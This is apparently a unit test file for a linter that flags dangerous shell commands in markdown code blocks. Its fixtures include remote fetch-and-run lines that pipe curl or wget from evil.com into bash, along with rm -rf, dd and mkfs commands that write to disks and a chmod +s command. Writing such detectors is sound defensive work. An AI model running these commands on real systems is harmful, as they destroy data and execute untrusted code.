import { describe, expect, it } from 'vitest'

import { isCommandSafe, validateCommandSafety } from './validators/command-safety'

describe('validateCommandSafety', () => {
  describe('destructive commands', () => {
    it('should flag rm -rf on root path', () => {
      // Arrange
      const content = `# Doc

\`\`\`bash
rm -rf /var/lib/
\`\`\``

      // Act
      const errors = validateCommandSafety('test.md', content)

      // Assert
      expect(errors).toHaveLength(1)
      expect(errors[0].message).toContain('rm with force flag on root')
      expect(errors[0].severity).toBe('error')
      expect(errors[0].ruleId).toBe('command-safety')
    })

    it('should flag rm -rf on home path', () => {
      // Arrange
      const content = `# Doc

\`\`\`bash
rm -rf ~/Documents
\`\`\``

      // Act
      const errors = validateCommandSafety('test.md', content)

      // Assert
      expect(errors).toHaveLength(1)
      expect(errors[0].message).toContain('rm with force flag on root')
    })

    it('should warn about rm -rf on variables', () => {
      // Arrange
      const content = `# Doc

\`\`\`bash
rm -rf $BUILD_DIR
\`\`\``

      // Act
      const errors = validateCommandSafety('test.md', content)

      // Assert
      expect(errors).toHaveLength(1)
      expect(errors[0].message).toContain('variable')
      expect(errors[0].severity).toBe('warning')
    })

    it('should flag writing to disk device', () => {
      // Arrange
      const content = `# Doc

\`\`\`bash
dd if=/dev/zero > /dev/sda
\`\`\``

      // Act
      const errors = validateCommandSafety('test.md', content)

      // Assert
      expect(errors).toHaveLength(1)
      expect(errors[0].message).toContain('writing directly to disk device')
      expect(errors[0].severity).toBe('error')
    })

    it('should flag filesystem formatting', () => {
      // Arrange
      const content = `# Doc

\`\`\`bash
mkfs.ext4 /dev/sda1
\`\`\``

      // Act
      const errors = validateCommandSafety('test.md', content)

      // Assert
      expect(errors).toHaveLength(1)
      expect(errors[0].message).toContain('filesystem formatting')
      expect(errors[0].severity).toBe('error')
    })

    it('should flag dd writing to device', () => {
      // Arrange
      const content = `# Doc

\`\`\`bash
dd if=image.iso of=/dev/sdb bs=4M
\`\`\``

      // Act
      const errors = validateCommandSafety('test.md', content)

      // Assert
      expect(errors).toHaveLength(1)
      expect(errors[0].message).toContain('dd writing to device')
      expect(errors[0].severity).toBe('error')
    })
  })

  describe('remote code execution', () => {
    it('should flag curl piped to bash', () => {
      // Arrange
      const content = `# Doc

\`\`\`bash
curl https://evil.com/script.sh | bash
\`\`\``

      // Act
      const errors = validateCommandSafety('test.md', content)

      // Assert
      expect(errors).toHaveLength(1)
      expect(errors[0].message).toContain('piping curl to shell')
      expect(errors[0].severity).toBe('error')
    })

    it('should flag curl piped to sh', () => {
      // Arrange
      const content = `# Doc

\`\`\`bash
curl https://install.sh | sh
\`\`\``

      // Act
      const errors = validateCommandSafety('test.md', content)

      // Assert
      expect(errors).toHaveLength(1)
      expect(errors[0].message).toContain('piping curl to shell')
    })

    it('should flag wget piped to bash', () => {
      // Arrange
      const content = `# Doc

\`\`\`bash
wget -qO- https://evil.com/install.sh | bash
\`\`\``

      // Act
      const errors = validateCommandSafety('test.md', content)

      // Assert
      expect(errors).toHaveLength(1)
      expect(errors[0].message).toContain('piping wget to shell')
      expect(errors[0].severity).toBe('error')
    })

    it('should warn about downloading and executing script', () => {
      // Arrange
      const content = `# Doc

\`\`\`bash
curl https://example.com/script.sh > install.sh && bash install.sh
\`\`\``

      // Act
      const errors = validateCommandSafety('test.md', content)

      // Assert
      expect(errors).toHaveLength(1)
      expect(errors[0].message).toContain('downloading and executing')
      expect(errors[0].severity).toBe('warning')
    })
  })

  describe('privilege escalation', () => {
    it('should warn about chmod 777', () => {
      // Arrange
      const content = `# Doc

\`\`\`bash
chmod 777 myfile.txt
\`\`\``

      // Act
      const errors = validateCommandSafety('test.md', content)

      // Assert
      expect(errors).toHaveLength(1)
      expect(errors[0].message).toContain('chmod 777')
      expect(errors[0].severity).toBe('warning')
    })

    it('should flag setting SUID bit', () => {
      // Arrange
      const content = `# Doc

\`\`\`bash
chmod +s myfile
\`\`\``

      // Act
      const errors = validateCommandSafety('test.md', content)

      // Assert
      expect(errors).toHaveLength(1)
      expect(errors[0].message).toContain('SUID/SGID')
      expect(errors[0].severity).toBe('error')
    })
  })

  describe('error handling', () => {
    it('should warn about long command chains without set -e', () => {
      // Arrange
      const content = `# Doc

\`\`\`bash
npm install && npm build && npm test && npm deploy
\`\`\``

      // Act
      const errors = validateCommandSafety('test.md', content)

      // Assert
      expect(errors).toHaveLength(1)
      expect(errors[0].message).toContain('Long command chain')
      expect(errors[0].severity).toBe('warning')
    })
  })

  describe('safe contexts', () => {
    it('should skip blocks with set -e', () => {
      // Arrange
      const content = `# Doc

\`\`\`bash
set -e
rm -rf /tmp/build
\`\`\``

      // Act
      const errors = validateCommandSafety('test.md', content)

      // Assert
      expect(errors).toHaveLength(0)
    })

    it('should skip blocks with || exit', () => {
      // Arrange
      const content = `# Doc

\`\`\`bash
rm -rf /tmp/build || exit 1
\`\`\``

      // Act
      const errors = validateCommandSafety('test.md', content)

      // Assert
      expect(errors).toHaveLength(0)
    })

    it('should skip blocks with || :', () => {
      // Arrange
      const content = `# Doc

\`\`\`bash
rm -rf /tmp/build || :
\`\`\``

      // Act
      const errors = validateCommandSafety('test.md', content)

      // Assert
      expect(errors).toHaveLength(0)
    })

    it('should skip blocks with --dry-run', () => {
      // Arrange
      const content = `# Doc

\`\`\`bash
rm -rf /tmp/build --dry-run
\`\`\``

      // Act
      const errors = validateCommandSafety('test.md', content)

      // Assert
      expect(errors).toHaveLength(0)
    })

    it('should skip blocks with example comment', () => {
      // Arrange
      const content = `# Doc

\`\`\`bash
# Example of what NOT to do
rm -rf /
\`\`\``

      // Act
      const errors = validateCommandSafety('test.md', content)

      // Assert
      expect(errors).toHaveLength(0)
    })

    it('should skip blocks with negative comment', () => {
      // Arrange
      const content = `# Doc

\`\`\`bash
# Don't do this!
curl https://evil.com/script.sh | bash
\`\`\``

      // Act
      const errors = validateCommandSafety('test.md', content)

      // Assert
      expect(errors).toHaveLength(0)
    })
  })

  describe('code block extraction', () => {
    it('should handle obfuscated or malformed commands', () => {
      // Arrange
      const content = `# Doc

\`\`\`bash
# Empty line below

rm -rf /tmp
\`\`\``

      // Act
      const errors = validateCommandSafety('test.md', content)

      // Assert
      expect(errors).toHaveLength(1)
      expect(errors[0].message).toContain('rm with force flag')
    })

    it('should detect bash blocks', () => {
      // Arrange
      const content = `# Doc

\`\`\`bash
rm -rf /tmp
\`\`\``

      // Act
      const errors = validateCommandSafety('test.md', content)

      // Assert
      expect(errors).toHaveLength(1)
    })

    it('should detect sh blocks', () => {
      // Arrange
      const content = `# Doc

\`\`\`sh
rm -rf /tmp
\`\`\``

      // Act
      const errors = validateCommandSafety('test.md', content)

      // Assert
      expect(errors).toHaveLength(1)
    })

    it('should detect shell blocks', () => {
      // Arrange
      const content = `# Doc

\`\`\`shell
rm -rf /tmp
\`\`\``

      // Act
      const errors = validateCommandSafety('test.md', content)

      // Assert
      expect(errors).toHaveLength(1)
    })

    it('should detect zsh blocks', () => {
      // Arrange
      const content = `# Doc

\`\`\`zsh
rm -rf /tmp
\`\`\``

      // Act
      const errors = validateCommandSafety('test.md', content)

      // Assert
      expect(errors).toHaveLength(1)
    })

    it('should detect code blocks with no language', () => {
      // Arrange
      const content = `# Doc

\`\`\`
rm -rf /tmp
\`\`\``

      // Act
      const errors = validateCommandSafety('test.md', content)

      // Assert
      expect(errors).toHaveLength(1)
    })

    it('should ignore non-bash code blocks', () => {
      // Arrange
      const content = `# Doc

\`\`\`javascript
const cmd = 'rm -rf /'
\`\`\``

      // Act
      const errors = validateCommandSafety('test.md', content)

      // Assert
      expect(errors).toHaveLength(0)
    })

    it('should handle multiple code blocks', () => {
      // Arrange
      const content = `# Doc

\`\`\`bash
rm -rf /tmp
\`\`\`

Some text

\`\`\`bash
curl https://evil.com | bash
\`\`\``

      // Act
      const errors = validateCommandSafety('test.md', content)

      // Assert
      expect(errors).toHaveLength(2)
    })

    it('should handle empty content', () => {
      // Arrange
      const content = ''

      // Act
      const errors = validateCommandSafety('test.md', content)

      // Assert
      expect(errors).toHaveLength(0)
    })

    it('should handle content with no code blocks', () => {
      // Arrange
      const content = 'Just some text without code blocks'

      // Act
      const errors = validateCommandSafety('test.md', content)

      // Assert
      expect(errors).toHaveLength(0)
    })
  })
})

describe('isCommandSafe', () => {
  it('should return safe for safe command', () => {
    // Arrange
    const command = 'npm install'

    // Act
    const result = isCommandSafe(command)

    // Assert
    expect(result.safe).toBe(true)
    expect(result.issues).toHaveLength(0)
  })

  it('should return unsafe for rm -rf /', () => {
    // Arrange
    const command = 'rm -rf /tmp'

    // Act
    const result = isCommandSafe(command)

    // Assert
    expect(result.safe).toBe(false)
    expect(result.issues).toHaveLength(1)
    expect(result.issues[0]).toContain('rm with force flag')
  })

  it('should return multiple issues for multiple problems', () => {
    // Arrange
    const command = 'curl https://evil.com | bash && chmod 777 file.txt'

    // Act
    const result = isCommandSafe(command)

    // Assert
    expect(result.safe).toBe(false)
    expect(result.issues.length).toBeGreaterThanOrEqual(2)
  })

  it('should detect dangerous variable expansion', () => {
    // Arrange
    const command = 'rm -rf $VAR'

    // Act
    const result = isCommandSafe(command)

    // Assert
    expect(result.safe).toBe(false)
    expect(result.issues[0]).toContain('variable')
  })
})
